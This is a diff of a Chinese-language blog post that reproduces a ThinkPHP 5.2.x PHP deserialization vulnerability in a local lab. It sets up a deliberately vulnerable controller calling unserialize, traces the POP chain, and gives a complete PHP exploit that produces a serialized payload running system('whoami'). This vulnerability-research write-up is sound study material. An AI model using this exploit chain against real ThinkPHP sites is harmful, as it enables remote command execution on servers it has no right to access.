@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/08/7iGJlBDI4yM5uZO.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/08/1tnbOkUJjaFcyAK.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/08/va5J12cbWjmtBCY.png">
-<meta property="og:updated_time" content="2019-10-27T03:22:06.352Z">
+<meta property="og:updated_time" content="2019-12-01T05:53:06.870Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ThinkPHP5.2.x反序列化复现">
 <meta name="twitter:description" content="这两天跟着七月火师傅的blog复现了几个tp5的sql注入漏洞，自己也不知道是否真的消化了，慢慢来把，今天跟着力哥复现下tp5的反序列化漏洞">
@@ -195,14 +195,14 @@
 <p>获取测试环境代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.2.x-dev tpdemo</span><br></pre></td></tr></table></figure>
 
-<p>修改app/controller/Index.php</p>
+<p>修改<code>app/controller/Index.php</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index($input=&apos;&apos;)</span><br><span class="line">    &#123;   </span><br><span class="line">        unserialize($input);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>启动</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd tpdemo</span><br><span class="line">php think run</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>tp5.2.x和tp5.1及tp5.0好像有点不一样，我直接访问提示控制器不存在:app\controller\Tpdemo，</p>
+<p><code>tp5.2.x</code>和<code>tp5.1及tp5.0</code>有点不一样，我直接访问<code>/public</code>提示控制器不存在<code>app\controller\Tpdemo</code>，</p>
 <p>换一种启动方式，这种感觉和flask有点像😁</p>
 </blockquote>
 <h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><p>payload</p>
@@ -212,47 +212,53 @@
 <h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
 <p>复现完之前tp5.1反序列化漏洞，前面的pop链不变</p>
 </blockquote>
+<p><strong>注意 phpstormEvent log</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Composer</span><br><span class="line">Composer configuration file composer.json found. Project settings are synchronized with Show </span><br><span class="line">Composer settings   Revert</span><br></pre></td></tr></table></figure>
+
+<p>主要<code>Revert</code>下，不然无法直接搜索</p>
 <p>反序列化入口</p>
 <p>Windows类-&gt;__destruct()-&gt;removeFiles()-&gt;file_exists()-&gt;<em>\</em>toString()</p>
 <p>如果我们传入的$files为对象，该__toString()将会被调用</p>
 <p>Conversion类-&gt;__String()-&gt;toJson()-&gt;toArray()</p>
 <blockquote>
-<p>之前tp5.1.x是利用类似$val-&gt;visible($this-&gt;visible[$key]);去调用__call()</p>
+<p>之前<code>tp5.1.x</code>是利用类似<code>$val-&gt;visible($this-&gt;visible[$key]);</code>去调用<code>__call()</code></p>
 </blockquote>
-<p>toArray()</p>
+<p><code>toArray()</code>方法</p>
 <p><img src="https://i.loli.net/2019/10/08/TdBOgv84URN1MPr.png" alt="Snipaste_2019-10-08_22-54-22.png"></p>
-<p>这里关注getAttr()和getValue()</p>
+<p>这里关注<code>getAttr()</code>和<code>getValue()</code></p>
 <p><img src="https://i.loli.net/2019/10/08/ovDjMPmp8zu6SAb.png" alt="Snipaste_2019-10-08_22-36-09.png"></p>
-<p>跟踪getValue()</p>
+<p>跟踪<code>getValue()</code></p>
 <p><img src="https://i.loli.net/2019/10/08/6ntoSAJp52FZ7Gg.png" alt="Snipaste_2019-10-08_22-40-51.png"></p>
-<p>$closure=$this-&gt;withAttr[$fieldName];</p>
-<p>withAttr是一个我们可控的数组。。。$fieldName跟踪一下</p>
+<p><code>$closure=$this-&gt;withAttr[$fieldName];</code></p>
+<p><code>withAttr</code>是一个我们可控的数组。。。<code>$fieldName</code>跟踪一下</p>
 <p><img src="https://i.loli.net/2019/10/08/YaeEScqnbhktgN3.png" alt="Snipaste_2019-10-08_22-46-10.png"></p>
-<p>我们也是可控的，我们控制$closure为system</p>
-<p>那么只需要解决$value</p>
-<p>追踪一下，熟悉的getData()</p>
+<p>我们也是可控的，我们控制<code>$closure</code>为<code>system</code></p>
+<p>那么只需要解决<code>$value</code></p>
+<p>追踪一下，熟悉的<code>getData()</code></p>
 <p><img src="https://i.loli.net/2019/10/08/5nJSB3MlOPIyaL4.png" alt="Snipaste_2019-10-08_22-38-28.png"></p>
-<p>$data是我们可控的，fieldName也是可控的。那么继续往前看</p>
-<p>也就是toArray()函数中的</p>
+<p><code>$data</code>是我们可控的，<code>fieldName</code>也是可控的。那么继续往前看</p>
+<p>也就是<code>toArray()</code>函数中的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$item[$key] = $this-&gt;getAttr($key);</span><br></pre></td></tr></table></figure>
 
-<p>$key是$data数组的键，而</p>
+<p><code>$key</code>是<code>$data</code>数组的键，而</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = array_merge($this-&gt;data, $this-&gt;relation);</span><br></pre></td></tr></table></figure>
 
 <p>这两个数组我们也可控😁</p>
 <blockquote>
 <p>然后是具体构造exp的一些细节</p>
 </blockquote>
-<p>Conversion是trait类型的，不能实例化，通过use来使用，搜索定位到Model类，</p>
-<p>发现__construct()构造方法中传入$data数组</p>
+<p><code>Conversion</code>是<code>trait类型</code>的，不能实例化，通过<code>use</code>来使用，搜索定位到<code>Model类</code>，</p>
+<p>发现<code>__construct()</code>构造方法中传入<code>$data数组</code></p>
 <p><img src="https://i.loli.net/2019/10/08/7iGJlBDI4yM5uZO.png" alt="Snipaste_2019-10-08_23-05-36.png"></p>
-<p>然而Model是抽象类，也不能实例化，寻找一个子类，找到Pivot类</p>
+<p>然而<code>Model是抽象类</code>，也不能实例化，寻找一个子类，找到<code>Pivot类</code></p>
 <p><img src="https://i.loli.net/2019/10/08/1tnbOkUJjaFcyAK.png" alt="Snipaste_2019-10-08_23-09-24.png"></p>
 <p>这里构造方法调用了父类构造方法</p>
 <p><img src="https://i.loli.net/2019/10/08/va5J12cbWjmtBCY.png" alt="Snipaste_2019-10-08_23-10-39.png"></p>
 <p>那么构造exp</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows&#123;</span><br><span class="line">        private $files = [];</span><br><span class="line">        function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = $files;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\concern &#123;</span><br><span class="line">    trait Conversion&#123;</span><br><span class="line">        protected $visible;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trait RelationShip&#123;</span><br><span class="line">        private $relation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trait Attribute&#123;</span><br><span class="line">        private $withAttr;</span><br><span class="line">        private $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        use model\concern\RelationShip;</span><br><span class="line">        use model\concern\Conversion;</span><br><span class="line">        use model\concern\Attribute;</span><br><span class="line"></span><br><span class="line">        function __construct($closure)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;data = $closure;</span><br><span class="line">            $this-&gt;relation = [];</span><br><span class="line">            $this-&gt;visible= [];</span><br><span class="line">            $this-&gt;withAttr = array(&quot;glotozz&quot;=&gt;&apos;system&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model &#123;</span><br><span class="line">    class Pivot extends \think\Model&#123;</span><br><span class="line">        function __construct($closure)</span><br><span class="line">        &#123;</span><br><span class="line">            parent::__construct($closure);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $pivot = new think\model\Pivot([&apos;glotozz&apos;=&gt;&apos;whoami&apos;]);</span><br><span class="line">    $windows = new think\process\pipes\Windows([$pivot]);</span><br><span class="line">    echo urlencode(serialize($windows));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>哎，能理解exp不一定能立马写出来。。</p>
+<p>总结一下POP链</p>
 <p>Windows类-&gt;__destruct()-&gt;removeFiles()-&gt;file_exists()-&gt;__toString()</p>
 <p>如果我们传入的$files为对象，该__toString()将会被调用</p>
 <p>Conversion类-&gt;__String()-&gt;toJson()-&gt;toArray()-&gt;getAttr()-&gt;getValue()</p>
